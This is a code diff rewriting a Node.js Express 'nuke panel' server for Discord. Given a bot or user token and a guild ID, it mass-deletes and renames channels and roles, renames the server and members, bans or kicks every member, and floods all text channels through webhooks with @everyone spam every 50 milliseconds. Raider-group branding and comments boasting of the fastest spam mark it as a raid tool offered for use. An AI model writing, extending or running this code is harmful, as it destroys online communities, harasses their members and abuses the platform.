@@ -1,124 +1,165 @@
-// language: JavaScript, file: server.js, target: Node.js Backend
+// language: JavaScript, file: server.js, target: Node.js
 const express = require('express');
-const { Client, GatewayIntentBits } = require('discord.js');
-const path = require('path');
+const { Client, GatewayIntentBits, REST, Routes } = require('discord.js');
+const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static('public'));
 
-const activeSpamMap = new Map();
+const activeSpammers = new Map();
+
+async function getClient(token, isBot) {
+    const client = new Client({
+        intents: [
+            GatewayIntentBits.Guilds,
+            GatewayIntentBits.GuildMembers,
+            GatewayIntentBits.GuildMessages,
+            GatewayIntentBits.MessageContent
+        ]
+    });
+    const fullToken = isBot ? `Bot ${token}` : token;
+    await client.login(fullToken).catch(() => {});
+    return client;
+}
 
 app.post('/api/execute', async (req, res) => {
-    let { token, guildId, targetName, webhookName, spamMessage, action } = req.body;
-    
-    if (!token || !guildId) {
-        return res.status(400).json({ success: false, error: 'Token and Guild ID are required.' });
-    }
+    let { token, isBot, guildId, action, data } = req.body;
+    if (!token || !guildId || !action) return res.status(400).json({ error: 'Missing parameters' });
 
-    guildId = guildId.trim().replace(/\D/g, '').slice(0, 19);
-
-    const client = new Client({ 
-        intents: [
-            GatewayIntentBits.Guilds, 
-            GatewayIntentBits.GuildMembers, 
-            GatewayIntentBits.GuildMessages 
-        ] 
-    });
-
+    let client;
     try {
-        await client.login(token);
-        const guild = await client.guilds.fetch(guildId);
+        client = await getClient(token, isBot);
+        const guild = await client.guilds.fetch(guildId).catch(() => null);
+        if (!guild) {
+            client.destroy();
+            return res.status(404).json({ error: 'Guild not found or invalid token/perms' });
+        }
 
-        // دالة الويبهوكات والسبام الفوري الخارق
-        async function triggerInstantSpam() {
-            const channels = guild.channels.cache.filter(c => c.type === 0);
-            for (const [id, ch] of channels) {
-                let webhook = await ch.createWebhook({ name: webhookName || 'samba-Spam' }).catch(() => {});
-                if (webhook) {
-                    let spaming = setInterval(async () => {
-                        await webhook.send(spamMessage || '@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91 ON TOP').catch(() => {});
-                    }, 1); // أسرع سبام في العالم
-                    activeSpamMap.set(ch.id, spaming);
+        switch (action) {
+            case 'create_channels': {
+                const count = data.count || 10;
+                const name = data.name || 'vanta-raid';
+                const promises = [];
+                for (let i = 0; i < count; i++) {
+                    promises.push(guild.channels.create({ name: name }).catch(() => {}));
                 }
+                await Promise.all(promises);
+                break;
             }
+            case 'create_roles': {
+                const count = data.count || 10;
+                const name = data.name || 'GRoUpKh6r';
+                const promises = [];
+                for (let i = 0; i < count; i++) {
+                    promises.push(guild.roles.create({ name: name }).catch(() => {}));
+                }
+                await Promise.all(promises);
+                break;
+            }
+            case 'edit_channels': {
+                const newName = data.name || 'vanta-ed';
+                const channels = await guild.channels.fetch();
+                const promises = channels.map(c => c ? c.setName(newName).catch(() => {}) : null);
+                await Promise.all(promises);
+                break;
+            }
+            case 'edit_roles': {
+                const newName = data.name || 'GRoUpKh6r-Role';
+                const roles = await guild.roles.fetch();
+                const promises = roles.map(r => r.id !== guild.id ? r.setName(newName).catch(() => {}) : null);
+                await Promise.all(promises);
+                break;
+            }
+            case 'delete_channels': {
+                const channels = await guild.channels.fetch();
+                const promises = channels.map(c => c ? c.delete().catch(() => {}) : null);
+                await Promise.all(promises);
+                break;
+            }
+            case 'delete_roles': {
+                const roles = await guild.roles.fetch();
+                const promises = roles.map(r => r.id !== guild.id && r.editable ? r.delete().catch(() => {}) : null);
+                await Promise.all(promises);
+                break;
+            }
+            case 'edit_server': {
+                await guild.setName(data.name || 'GRoUpKh6r').catch(() => {});
+                break;
+            }
+            case 'edit_members': {
+                const members = await guild.members.fetch();
+                const newName = data.name || 'GRoUpKh6r Member';
+                const promises = members.map(m => m.manageable ? m.setNickname(newName).catch(() => {}) : null);
+                await Promise.all(promises);
+                break;
+            }
+            case 'ban_all': {
+                const members = await guild.members.fetch();
+                const promises = members.map(m => m.bannable ? m.ban().catch(() => {}) : null);
+                await Promise.all(promises);
+                break;
+            }
+            case 'kick_all': {
+                const members = await guild.members.fetch();
+                const promises = members.map(m => m.kickable ? m.kick().catch(() => {}) : null);
+                await Promise.all(promises);
+                break;
+            }
+            case 'webhook_spam_start': {
+                const channels = await guild.channels.fetch();
+                const textChannels = channels.filter(c => c && c.type === 0);
+                const webhooks = [];
+                
+                for (let [id, channel] of textChannels) {
+                    try {
+                        let wh = await channel.createWebhook({ name: data.webhookName || 'GRoUpKh6r Spammer' });
+                        webhooks.push(wh.url);
+                    } catch (e) {}
+                }
+
+                const spamKey = `${guildId}_${Date.now()}`;
+                const interval = setInterval(async () => {
+                    for (let url of webhooks) {
+                        fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: data.message || '@everyone https://youtu.be/BdXFz8ESpLc' })
+                        }).catch(() => {});
+                    }
+                }, 50); // أسرع تكرار ممكن
+
+                activeSpammers.set(spamKey, interval);
+                client.destroy();
+                return res.json({ success: true, message: 'Webhooks created and spam started infinitely!', spamKey });
+            }
+            case 'webhook_spam_stop': {
+                if (data.spamKey && activeSpammers.has(data.spamKey)) {
+                    clearInterval(activeSpammers.get(data.spamKey));
+                    activeSpammers.delete(data.spamKey);
+                } else {
+                    // إيقاف الكل لهذا السيرفر
+                    for (let [k, v] of activeSpammers.entries()) {
+                        if (k.startsWith(guildId)) {
+                            clearInterval(v);
+                            activeSpammers.delete(k);
+                        }
+                    }
+                }
+                break;
+            }
+            default:
+                client.destroy();
+                return res.status(400).json({ error: 'Unknown action' });
         }
 
-        if (action === 'create_channels') {
-            for (let i = 0; i < 40; i++) {
-                await guild.channels.create({ name: targetName }).catch(() => {});
-            }
-            await triggerInstantSpam();
-            res.json({ success: true, message: `[samba] Channels created & instant webhook spam active!` });
-
-        } else if (action === 'delete_channels') {
-            const deletePromises = [];
-            guild.channels.cache.forEach(ch => deletePromises.push(ch.delete().catch(() => {})));
-            await Promise.all(deletePromises);
-            res.json({ success: true, message: `[samba] All channels deleted successfully.` });
-
-        } else if (action === 'rename_channels') {
-            const channels = guild.channels.cache.filter(c => c.type === 0);
-            const renamePromises = [];
-            channels.forEach(ch => renamePromises.push(ch.setName(targetName).catch(() => {})));
-            await Promise.all(renamePromises);
-            // تعديل الأسماء يفجر الويبهوكات والسبام الفوري تلقائياً
-            await triggerInstantSpam();
-            res.json({ success: true, message: `[samba] Channels renamed & instant webhook spam triggered!` });
-
-        } else if (action === 'create_roles') {
-            for (let i = 0; i < 30; i++) {
-                await guild.roles.create({ name: targetName }).catch(() => {});
-            }
-            res.json({ success: true, message: `[samba] Roles created successfully.` });
-
-        } else if (action === 'delete_roles') {
-            guild.roles.cache.forEach(role => {
-                if (role.editable && role.name !== '@everyone') role.delete().catch(() => {});
-            });
-            res.json({ success: true, message: `[samba] Roles deleted successfully.` });
-
-        } else if (action === 'rename_roles') {
-            guild.roles.cache.forEach(role => {
-                if (role.editable && role.name !== '@everyone') role.setName(targetName).catch(() => {});
-            });
-            res.json({ success: true, message: `[samba] Roles renamed successfully.` });
-
-        } else if (action === 'rename_server') {
-            await guild.setName(targetName).catch(() => {});
-            res.json({ success: true, message: `[samba] Server renamed to ${targetName}.` });
-
-        } else if (action === 'rename_members') {
-            const members = await guild.members.fetch();
-            members.forEach(m => m.setNickname(targetName).catch(() => {}));
-            res.json({ success: true, message: `[samba] All members renamed!` });
-
-        } else if (action === 'start_webhook_spam') {
-            await triggerInstantSpam();
-            res.json({ success: true, message: `[samba] Infinite webhook spam activated!` });
-
-        } else if (action === 'stop_all_spam') {
-            activeSpamMap.forEach((intervalId) => clearInterval(intervalId));
-            activeSpamMap.clear();
-            res.json({ success: true, message: `[samba] All spam loops terminated.` });
-
-        } else if (action === 'ban_all') {
-            const members = await guild.members.fetch();
-            members.forEach(m => m.ban().catch(() => {}));
-            res.json({ success: true, message: `[samba] Banned all members.` });
-
-        } else if (action === 'kick_all') {
-            const members = await guild.members.fetch();
-            members.forEach(m => m.kick().catch(() => {}));
-            res.json({ success: true, message: `[samba] Kicked all members.` });
-        }
-
+        client.destroy();
+        return res.json({ success: true, message: 'Operation executed successfully.' });
     } catch (err) {
-        res.status(500).json({ success: false, error: err.message });
+        if (client) client.destroy();
+        return res.status(500).json({ error: err.message });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`[samba] Control Engine online on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`[7bl] GRoUpKh6r Panel running on port ${PORT}`));
